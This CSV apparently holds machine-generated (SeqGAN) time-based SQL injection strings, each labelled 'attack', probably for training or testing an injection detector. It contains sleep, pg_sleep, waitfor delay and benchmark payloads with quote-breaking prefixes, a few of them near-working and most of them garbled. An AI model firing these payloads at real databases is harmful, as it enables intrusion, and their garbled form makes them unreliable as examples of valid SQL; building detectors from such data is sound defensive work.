label,payload,family,payload_type,method,run_id,sample_index
attack,or from @   perp where if benchmark  (  ) end  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,0
attack,"1%'"" or --d.tuajxtsi8781 7629 8140  =  =   5  =  select waitfor or from 8036  =  =  7739 3885 delay and where  and sleep  (  _s *  (  =   (  select de where sleep  (  =  _s  )    )   orsleep  (   (  )    )    )    )    orl 4240 13616784  =r e delay not  (  (  3114 6456  from and    5702 and '0:0:2' from *  =  sleep  (  3114 delay and",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,1
attack,1'sleep  (  )  =serioand --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,2
attack,""" or sleep  (  __TIME__  )    =  """"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""iersn  )  )    or where delay '0:0:__TIME__'    ( =  (  ,(    ) 0)    )    aserase'  )    )    where  =  * delay where ) delay '0:0:2' 4287 '0:0:2' delay 1361  =  1361 -- '0:0:2' from r delay not  (  3114 waitfor delay delay or sleep  (  (  benchmark  9443  (  (  5   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,3
attack,"1"" and 6784 not  =  =  (  select not delay,sleep  (  sleep  (  5   )   )    g""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,4
attack,""" 'sa' from 8466 =    0x76555642 delay not  8036 delay delay delay from t delay '0:0:2' '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,5
attack,"5  )   )    ase@pho if eltlt  =    5000000, delay =  m e dt emd where 4287 delay waitfor  =  (  sleep sleep  (  select pg_sleep  8140 not  = where when  ,l where not  =    (  3114  =  )    =     (  waitfor2657  4287 '0:0:__TIME__'from delay delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,6
attack,1%' ; and @6456ielo kl delay and or   delay 9862 elrpelt  (  )  )    or from '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,7
attack,"1 --    =  8781 or or   (    (    (  )    )        @'sa'yoco  (    )    or  from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,8
attack,if xir  (  )  ajx   usier dyipon  (  )    )    and waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,9
attack,1 not  (  'isintegratedsecurityonly'   )    )    or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,10
attack,1 paa if not   (   )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,11
attack,' and pg_sleep  (  (  9443 #y  (  (  )    )    end or  =  from  information_schema* delay not  (  9443s elt and 8140  =  '0:0:10'waitfor 3885  '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12
attack,1   )    s oelt  6784 delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13
attack,"1""   )    <> if or not  (  )     7629  5466 6784 '0:0:2' and 8781  (  1 * delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14
attack,  'isintegratedsecurityonly'   4287 elt  6456  8036 delay ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15
attack, or =  (  =    3885 from 4240 if delay et 7260 8781 8781  =  sleep  8781  = <> 1361  =  5702 from 8140 delay '0:0:2' <>  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16
attack,1   )    )    andpewhen mllt not  (  (  =  3114 0  =  1361  = elt  =  7739 delay--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17
attack,* if not  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18
attack,", or pg_sleep  (  =   select pg_sleep  'isintegratedsecurityonly' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19
attack,"""1 or 1TIMDryver_o if pg_sleep  (  =  )  2388  =  m dvsel  '0:0:10' ""  =  ""llt  _  =  =  =  s s etMnot  (  0x6d457153  )    as et  ,25, where (  select delay waitfor from delay 7260  2657 pg_sleep  =  sleep  (  8036 from '0:0:2' '0:0:2' 4287 8140 benchmark  (  3114 5466 =  =  5873 from not  (  6272 pg_sleep   delay '0:0:__TIME__' 8781  , sleep '0:0:__TIME__'waitfor ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20
attack,or pg_sleep  Md5  (  sleep  (  (  )   --    (  select benchmark  (  (   (    )    selectd    (    )   )    )    as 8594 where * *  (  =  5466 delay where 1361  (       waitfor waitfor delay delay if from delay fromd from a pg_sleep 5  3885 delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21
attack,"1 x'  (    'isintegratedsecurityonly'   _,      (  )  where waitfor delay and e sleep  (  =  =    )    )    or =  9443hdp rhbt '0:0:__TIME__'1   waitfor '0:0:2' from  not  =    (  (  '||  (  select '  5702 delay from or '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22
attack,1%'   )    )    as<>1361     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23
attack,1 where s 8514 delay from '0:0:__TIME__' not  (  )    and delay delay '0:0:2' elt  (  25 delay  benchmark  (  )   )    waitfor  delay  =  ( --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24
attack,1 6784 or delay  (  benchmark  6784  ( not from sleep  (  5  sleep  (  (  IMEs  ) if or @ or pg_sleep  IM)    (  # sleep  (  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25
attack,1%' )   waitfor  from  2840 8036 8140  = not(  u    = 9862  =  8140 8140  =   and from pg_sleep  5873 waitfor '0:0:2' delay  from not  =  2657  (  =  5 waitfor '0:0:2' from and delay =  (  )    if or 3824 pg_sleep  (  =     =  5 d pg_sleep  (   =    =    )    )    or 8140  (  3114 not  =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26
attack,1%f)    a0x76555642w where not  =  ' from t  =  5702  =   =  (  0x6d457153     or    =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27
attack,"  )    or sleep  (  5   )    )     ,waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """" if not #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29
attack,1   )    or   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30
attack, where if  '0:0:10'waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31
attack,    )    )    asei where  (  )    =    rsi 8 O)   waitforlvel  = not  (_,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" '0:0:10'if not  (  ,    )   waitfor not waitfor delay delay 8781 '0:0:2' and or where =  sleep  (  _TIME__T#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33
attack,1l'||  (  select 'oo  if or '0:0:2' 2388  =  =  5466 from where where  =  5   where 2657  = 4287 1 3885 delay 2388  = v eo where  =  =  1361 k waitfor elh elde ipt  (5466   (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34
attack, 8781     from if delay waitfor not  = '  =  ' delay 7260  =      =  = and not  (  )    8781 not  = ' if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35
attack," sleep ),  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36
attack, ( ' delay '0:0:2' delay sleep  (    (  2840 where 6784  =   delay '0:0:__TIME__''0:0:2' not  =  8781 8781 waitfor  =  =  delay where )    =  8781 4240 delay pg_sleep  =     '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37
attack,1 elt  5873 5    )  )    s  waitfor  5702 or 1  = 6793 delay delay 9862 1361  = c  delay if not  ( 4240 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38
attack,"1%"" or elt    6866 '0:0:2'  if  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39
attack,",det'isintegratedsecurityonly'   )    f not  (    )    )    end  <> if  delay benchmark  (  )      waitfors where 7260  = ""  =  3114 or 5466 from from where ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40
attack,"1"""" z where 0 25   )     from 4287 where not    = waitfor not  (  =  3114 from  or '0:0:2' 2388  =sv not sleep  (  5  )   )    waitfor or delay '0:0:__TIME__'waitfor --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41
attack, r 0  (  = et_  = -- x u 4240 '0:0:2' '0:0:2' from delay ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""'   )    )    rlike sleep  (  5  )   and    (    (   ' y""  (  )  )  )   waitfor from '0:0:2' ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43
attack,1   )    waitfor 3824   delay from  delay delay 9443 and epte  (  =  ;    )   information_schema6969 '0:0:__TIME__'from or,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44
attack,")    <> e  (  'isintegratedsecurityonly'   # ellelq  =  (  ,m  (  )   or  9862  =    _  8781  =  1361 and not  (  3114 delay '0:0:2' 1361  =  =  benchmark    ,m =e",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45
attack,""" > d notlt  (  ),)    or delay 8140  =  e  m 7629 waitfor if delay from 7260  =  7260  from 1361 s rs roselect if altselio aa where where if 7260 like elt benchmark  =  (  _TTI   )    <> et when   benchmark  E where 1361 6969 (     delay ,sleep and delay 5702   6456  =  benchmark  (  2657    =      <>    (  select and  if 2657 or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46
attack,"1f   y  (  )    # delay '0:0:10''0:0:__TIME__'( or sleep  =    (  )      waitfor ,m ihelr  4287  =  =  ' sleep  8036 delay from not  (  6456 not  (  ( 9443 and  1361  (  =  1361 from 1 or benchmark  (  =  ;u    = if not  (  selectt 9443--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47
attack,1 where  =  y .wecr  (  ' and delay delay 5873 not  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48
attack,"1""   )    aseoand pg_sleep  (  3114  waitfor waitfor not  (  5000000 delay from  5466 '0:0:2' delay '0:0:2' or or delay 5   )    )  -- 1 sleep  (  2657  , _  =  select *  or -- sleep  (  6784  )    or  (    waitfor  (  7260 delay  and not  (  (  3114 not     where benchmark  (  = '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49
attack,"1'   )    )    rlike sleep  (  5  )   and    (    (   '6456' eelt where  ,m7629  (  (     not  =  (  waitfor or (  10000000, delay not  (  =     '  not  (  )  _= --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50
attack, end  (  )    or d  not        =  = where delay delay if 5466  =  1361 where delay '0:0:2' delay c delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51
attack,""" y  1361  (  'isintegratedsecurityonly' if delay and 4240 '0:0:2' delay and elt D  (  5   )  =    f 5466 elp sleep  (  )    2840 not   d where and   (  select 8466 and waitfor and  if delay not  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52
attack,", x where rsbe'   sleep  =  (    )    )    where  waitfor delay from and not  (    (  )     6784 if  = 4240 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53
attack,1'   )    )    or els   (  =  ' delay delay or benchmark  =  (  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54
attack,"sleep  ,m  1  and waitfor and not   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55
attack,25sleep  (  )    =  --ze 6793s elt  (    waitfor  = 9862 delay 1361 )    =  =    )    or and delay delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56
attack,; if or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57
attack,"1%""   ) and  not  (      (  3114e not  5  o sleep  (    (  5000000--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58
attack,1'  )    and or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59
attack,; if if =  =  7629 s * not  =  = '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60
